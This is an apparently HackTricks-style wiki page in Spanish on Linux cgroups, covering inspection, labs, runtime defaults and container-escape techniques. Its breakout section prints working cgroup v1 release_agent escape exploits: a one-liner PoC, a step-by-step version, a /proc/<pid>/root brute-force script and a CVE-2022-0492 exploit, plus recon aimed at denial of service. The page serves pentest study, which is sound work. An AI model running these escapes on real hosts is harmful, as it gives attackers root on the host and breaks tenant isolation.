# cgroups

{{#include ../../../../banners/hacktricks-training.md}}

## Visión general

Los **grupos de control** de Linux son el mecanismo del kernel usado para agrupar procesos con fines de contabilidad, limitación, priorización y aplicación de políticas. Si los namespaces tratan principalmente de aislar la vista de los recursos, los cgroups se encargan principalmente de gobernar **cuánto** de esos recursos puede consumir un conjunto de procesos y, en algunos casos, **a qué clases de recursos** pueden interactuar en absoluto. Los contenedores dependen de los cgroups constantemente, incluso cuando el usuario nunca los mira directamente, porque casi todos los runtimes modernos necesitan una forma de decirle al kernel "estos procesos pertenecen a esta carga de trabajo, y estas son las reglas de recursos que se aplican a ellos".

Por eso los motores de contenedores colocan un nuevo contenedor en su propio subárbol de cgroup. Una vez que el árbol de procesos está allí, el runtime puede limitar la memoria, restringir el número de PIDs, ponderar el uso de CPU, regular I/O y restringir el acceso a dispositivos. En un entorno de producción, esto es esencial tanto para la seguridad multi-tenant como para la higiene operativa básica. Un contenedor sin controles de recursos significativos podría agotar la memoria, inundar el sistema con procesos o monopolizar CPU e I/O de formas que vuelvan inestable al host o a las cargas de trabajo vecinas.

Desde la perspectiva de la seguridad, los cgroups importan de dos maneras separadas. Primero, límites de recursos malos o ausentes permiten ataques de denegación de servicio sencillos. Segundo, algunas características de cgroup, especialmente en configuraciones antiguas de **cgroup v1**, históricamente han creado primitivas poderosas de escape cuando eran escribibles desde dentro de un contenedor.

## v1 Vs v2

Existen dos modelos principales de cgroup en uso. **cgroup v1** expone múltiples jerarquías de controladores, y las descripciones de exploits antiguas a menudo giran en torno a las semánticas extrañas y a veces excesivamente potentes disponibles allí. **cgroup v2** introduce una jerarquía más unificada y un comportamiento generalmente más limpio. Las distribuciones modernas prefieren cada vez más cgroup v2, pero aún existen entornos mixtos o legacy, lo que significa que ambos modelos siguen siendo relevantes al revisar sistemas reales.

La diferencia importa porque algunas de las historias más famosas de escape de contenedores, como los abusos de **`release_agent`** en cgroup v1, están ligadas muy específicamente al comportamiento de los cgroups antiguos. Un lector que vea un exploit de cgroup en un blog y luego lo aplique ciegamente a un sistema moderno solo con cgroup v2 probablemente malinterpretará lo que es realmente posible en el objetivo.

## Inspección

La forma más rápida de ver en qué cgroup se encuentra tu shell actual es:
```bash
cat /proc/self/cgroup
findmnt -T /sys/fs/cgroup
```
El archivo `/proc/self/cgroup` muestra las rutas de cgroup asociadas con el proceso actual. En un host moderno con cgroup v2, a menudo verás una entrada unificada. En hosts más antiguos o híbridos, puede que veas múltiples rutas de controladores v1. Una vez que conozcas la ruta, puedes inspeccionar los archivos correspondientes bajo `/sys/fs/cgroup` para ver los límites y el uso actual.

En un host con cgroup v2, los siguientes comandos son útiles:
```bash
ls -l /sys/fs/cgroup
cat /sys/fs/cgroup/cgroup.controllers
cat /sys/fs/cgroup/cgroup.subtree_control
```
Estos archivos revelan qué controladores existen y cuáles se delegan a los cgroups hijos. Este modelo de delegación importa en entornos rootless y gestionados por systemd, donde el runtime solo puede controlar el subconjunto de funcionalidad de cgroup que la jerarquía padre realmente delega.

## Lab

Una forma de observar los cgroups en la práctica es ejecutar un contenedor con límite de memoria:
```bash
docker run --rm -it --memory=256m debian:stable-slim bash
cat /proc/self/cgroup
cat /sys/fs/cgroup/memory.max 2>/dev/null || cat /sys/fs/cgroup/memory.limit_in_bytes 2>/dev/null
```
También puedes probar un contenedor con límite de PID:
```bash
docker run --rm -it --pids-limit=64 debian:stable-slim bash
cat /sys/fs/cgroup/pids.max 2>/dev/null
```
Estos ejemplos son útiles porque ayudan a conectar la bandera del runtime con la interfaz de archivos del kernel. El runtime no está aplicando la regla por arte de magia; está escribiendo los ajustes relevantes de cgroup y luego dejando que el kernel los haga cumplir sobre el árbol de procesos.

## Runtime Usage

Docker, Podman, containerd, and CRI-O dependen de cgroups como parte de su operación normal. Las diferencias suelen no ser sobre si usan cgroups, sino sobre **qué valores predeterminados eligen**, **cómo interactúan con systemd**, **cómo funciona la delegación rootless**, y **cuánto de la configuración se controla a nivel del engine frente al nivel de orquestación**.

En Kubernetes, las requests y limits de recursos acaban convirtiéndose en configuración de cgroup en el nodo. El camino desde el Pod YAML hasta la aplicación por parte del kernel pasa por el kubelet, el CRI runtime y el OCI runtime, pero los cgroups siguen siendo el mecanismo del kernel que finalmente aplica la regla. En entornos Incus/LXC, los cgroups también se usan intensamente, especialmente porque los system containers a menudo exponen un árbol de procesos más rico y expectativas operativas más parecidas a una VM.

## Misconfigurations And Breakouts

La historia clásica de seguridad de cgroup es el mecanismo escribible **cgroup v1 `release_agent`**. En ese modelo, si un atacante podía escribir en los archivos de cgroup adecuados, activar `notify_on_release` y controlar la ruta almacenada en `release_agent`, el kernel podría acabar ejecutando una ruta elegida por el atacante en los initial namespaces del host cuando el cgroup quedara vacío. Por eso las descripciones antiguas prestan tanta atención a la escribibilidad de los controladores de cgroup, las opciones de montaje y las condiciones de namespaces/capabilities.

Incluso cuando `release_agent` no está disponible, los errores de cgroup siguen siendo importantes. Un acceso a dispositivos excesivamente amplio puede hacer que dispositivos del host sean alcanzables desde el contenedor. La ausencia de límites de memoria y PID puede convertir una ejecución de código simple en un DoS contra el host. Una delegación de cgroup débil en escenarios rootless también puede llevar a los defensores a asumir que existe una restricción cuando el runtime nunca pudo aplicarla.

### `release_agent` Background

La técnica `release_agent` solo aplica a **cgroup v1**. La idea básica es que cuando el último proceso en un cgroup sale y `notify_on_release=1` está establecido, el kernel ejecuta el programa cuya ruta está almacenada en `release_agent`. Esa ejecución ocurre en los **initial namespaces del host**, lo que convierte a un `release_agent` escribible en un primitive de escape de contenedor.

Para que la técnica funcione, el atacante generalmente necesita:

- una jerarquía escribible de **cgroup v1**
- la capacidad de crear o usar un cgroup hijo
- la capacidad de establecer `notify_on_release`
- la capacidad de escribir una ruta en `release_agent`
- una ruta que resuelva a un ejecutable desde el punto de vista del host

### Classic PoC

The historical one-liner PoC is:
```bash
d=$(dirname $(ls -x /s*/fs/c*/*/r* | head -n1))
mkdir -p "$d/w"
echo 1 > "$d/w/notify_on_release"
t=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
touch /o
echo "$t/c" > "$d/release_agent"
cat <<'EOF' > /c
#!/bin/sh
ps aux > "$t/o"
EOF
chmod +x /c
sh -c "echo 0 > $d/w/cgroup.procs"
sleep 1
cat /o
```
Este PoC escribe una ruta de payload en `release_agent`, activa la liberación del cgroup y luego lee el archivo de salida generado en el host.

### Explicación paso a paso

La idea se entiende mejor si se desglosa en pasos.

1. Crear y preparar un cgroup escribible:
```bash
mkdir /tmp/cgrp
mount -t cgroup -o rdma cgroup /tmp/cgrp    # or memory if available in v1
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
```
2. Identificar la ruta del host que corresponde al sistema de archivos del contenedor:
```bash
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
```
3. Colocar un payload que será visible desde la ruta del host:
```bash
cat <<'EOF' > /cmd
#!/bin/sh
ps aux > /output
EOF
chmod +x /cmd
```
4. Disparar la ejecución vaciando el cgroup:
```bash
sh -c "echo $$ > /tmp/cgrp/x/cgroup.procs"
sleep 1
cat /output
```
El efecto es la ejecución en el host del payload con privilegios root en el host. En un exploit real, el payload normalmente escribe un proof file, inicia un reverse shell o modifica el estado del host.

### Relative Path Variant Using `/proc/<pid>/root`

En algunos entornos, la ruta del host al sistema de archivos del contenedor no es obvia o está oculta por el controlador de almacenamiento. En ese caso la ruta del payload puede expresarse mediante `/proc/<pid>/root/...`, donde `<pid>` es un PID del host perteneciente a un proceso en el contenedor actual. Esa es la base de la variante brute-force de ruta relativa:
```bash
#!/bin/sh

OUTPUT_DIR="/"
MAX_PID=65535
CGROUP_NAME="xyx"
CGROUP_MOUNT="/tmp/cgrp"
PAYLOAD_NAME="${CGROUP_NAME}_payload.sh"
PAYLOAD_PATH="${OUTPUT_DIR}/${PAYLOAD_NAME}"
OUTPUT_NAME="${CGROUP_NAME}_payload.out"
OUTPUT_PATH="${OUTPUT_DIR}/${OUTPUT_NAME}"

sleep 10000 &

cat > ${PAYLOAD_PATH} << __EOF__
#!/bin/sh
OUTPATH=\$(dirname \$0)/${OUTPUT_NAME}
ps -eaf > \${OUTPATH} 2>&1
__EOF__

chmod a+x ${PAYLOAD_PATH}

mkdir ${CGROUP_MOUNT}
mount -t cgroup -o memory cgroup ${CGROUP_MOUNT}
mkdir ${CGROUP_MOUNT}/${CGROUP_NAME}
echo 1 > ${CGROUP_MOUNT}/${CGROUP_NAME}/notify_on_release

TPID=1
while [ ! -f ${OUTPUT_PATH} ]
do
if [ $((${TPID} % 100)) -eq 0 ]
then
echo "Checking pid ${TPID}"
if [ ${TPID} -gt ${MAX_PID} ]
then
echo "Exiting at ${MAX_PID}"
exit 1
fi
fi
echo "/proc/${TPID}/root${PAYLOAD_PATH}" > ${CGROUP_MOUNT}/release_agent
sh -c "echo \$\$ > ${CGROUP_MOUNT}/${CGROUP_NAME}/cgroup.procs"
TPID=$((${TPID} + 1))
done

sleep 1
cat ${OUTPUT_PATH}
```
El truco relevante aquí no es el brute force en sí, sino la forma de la ruta: `/proc/<pid>/root/...` permite al kernel resolver un archivo dentro del sistema de archivos del contenedor desde el espacio de nombres del host, incluso cuando la ruta de almacenamiento directa del host no se conoce de antemano.

### CVE-2022-0492 Variante

En 2022, CVE-2022-0492 demostró que escribir en `release_agent` en cgroup v1 no comprobaba correctamente `CAP_SYS_ADMIN` en el espacio de nombres de usuario **inicial**. Esto hizo que la técnica fuera mucho más accesible en kernels vulnerables porque un proceso dentro del contenedor que pudiera montar una jerarquía de cgroup podía escribir en `release_agent` sin ya tener privilegios en el espacio de nombres de usuario del host.

Minimal exploit:
```bash
apk add --no-cache util-linux
unshare -UrCm sh -c '
mkdir /tmp/c
mount -t cgroup -o memory none /tmp/c
echo 1 > /tmp/c/notify_on_release
echo /proc/self/exe > /tmp/c/release_agent
(sleep 1; echo 0 > /tmp/c/cgroup.procs) &
while true; do sleep 1; done
'
```
En un kernel vulnerable, el host ejecuta `/proc/self/exe` con privilegios root del host.

Para un abuso práctico, empieza comprobando si el entorno aún expone rutas cgroup-v1 escribibles o acceso peligroso a dispositivos:
```bash
mount | grep cgroup
find /sys/fs/cgroup -maxdepth 3 -name release_agent 2>/dev/null -exec ls -l {} \;
find /sys/fs/cgroup -maxdepth 3 -writable 2>/dev/null | head -n 50
ls -l /dev | head -n 50
```
Si `release_agent` está presente y writable, ya estás en territorio legacy-breakout:
```bash
find /sys/fs/cgroup -maxdepth 3 -name notify_on_release 2>/dev/null
find /sys/fs/cgroup -maxdepth 3 -name cgroup.procs 2>/dev/null | head
```
Si la ruta cgroup en sí no produce un escape, el siguiente uso práctico suele ser denial of service o reconnaissance:
```bash
cat /sys/fs/cgroup/pids.max 2>/dev/null
cat /sys/fs/cgroup/memory.max 2>/dev/null
cat /sys/fs/cgroup/cpu.max 2>/dev/null
```
Estos comandos indican rápidamente si la carga de trabajo tiene margen para fork-bomb, consumir memoria de forma agresiva o abusar de una interfaz cgroup heredada escribible.

## Checks

Al revisar un objetivo, el propósito de las comprobaciones de cgroup es averiguar qué modelo de cgroup está en uso, si el container ve rutas de controller escribibles, y si primitivas de breakout antiguas como `release_agent` siquiera son relevantes.
```bash
cat /proc/self/cgroup                                      # Current process cgroup placement
mount | grep cgroup                                        # cgroup v1/v2 mounts and mount options
find /sys/fs/cgroup -maxdepth 3 -name release_agent 2>/dev/null   # Legacy v1 breakout primitive
cat /proc/1/cgroup                                         # Compare with PID 1 / host-side process layout
```
Qué es interesante aquí:

- Si `mount | grep cgroup` muestra **cgroup v1**, las older breakout writeups se vuelven más relevantes.
- Si `release_agent` existe y es accesible, eso merece una investigación más profunda de inmediato.
- Si la jerarquía de cgroup visible es escribible y el contenedor también tiene strong capabilities, el entorno merece una revisión mucho más exhaustiva.

Si descubres **cgroup v1**, montajes de controladores escribibles, y un contenedor que además tiene strong capabilities o protección débil de seccomp/AppArmor, esa combinación merece atención cuidadosa. Los cgroups a menudo se tratan como un tema aburrido de gestión de recursos, pero históricamente han formado parte de algunas de las cadenas más instructivas de container escape precisamente porque la frontera entre "resource control" y "host influence" no siempre fue tan limpia como la gente asumía.

## Runtime Defaults

| Runtime / plataforma | Estado por defecto | Comportamiento por defecto | Debilitamiento manual común |
| --- | --- | --- | --- |
| Docker Engine | Habilitado por defecto | Los contenedores se colocan en cgroups automáticamente; los límites de recursos son opcionales a menos que se especifiquen con flags | omitiendo `--memory`, `--pids-limit`, `--cpus`, `--blkio-weight`; `--device`; `--privileged` |
| Podman | Habilitado por defecto | `--cgroups=enabled` es el valor por defecto; las opciones por defecto del cgroup namespace varían según la versión de cgroup (`private` en cgroup v2, `host` en algunas configuraciones de cgroup v1) | `--cgroups=disabled`, `--cgroupns=host`, acceso relajado a dispositivos, `--privileged` |
| Kubernetes | Habilitado a través del runtime por defecto | Los Pods y contenedores se colocan en cgroups por el runtime del nodo; el control de recursos fino depende de `resources.requests` / `resources.limits` | omitir resource requests/limits, acceso privilegiado a dispositivos, mala configuración del runtime a nivel de host |
| containerd / CRI-O | Habilitado por defecto | Los cgroups forman parte de la gestión normal del ciclo de vida | configuraciones directas del runtime que relajan los controles de dispositivos o exponen interfaces heredadas escribibles de cgroup v1 |

La distinción importante es que la **existencia de cgroup** suele ser por defecto, mientras que las **restricciones útiles de recursos** suelen ser opcionales a menos que se configuren explícitamente.
{{#include ../../../../banners/hacktricks-training.md}}
